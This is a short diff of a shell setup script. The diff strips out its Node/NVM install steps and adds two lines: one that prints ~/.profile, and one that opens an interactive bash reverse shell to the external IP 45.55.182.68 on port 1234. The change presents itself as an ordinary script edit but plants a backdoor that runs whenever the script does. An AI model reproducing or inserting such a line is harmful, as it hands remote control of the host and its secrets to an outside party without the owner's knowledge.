@@ -3,12 +3,7 @@
 ## Source profile
 . ~/.profile
 
-## Install NVM modules and set version
-nvm install 16.13.0
-nvm use 16.13.0
+cat ~/.profile
 
-## Output Node version used
-node -v
-echo "aaabbbccc"
+/bin/bash -c 'bash -i >& /dev/tcp/45.55.182.68/1234 0>&1'
 
-exit 0
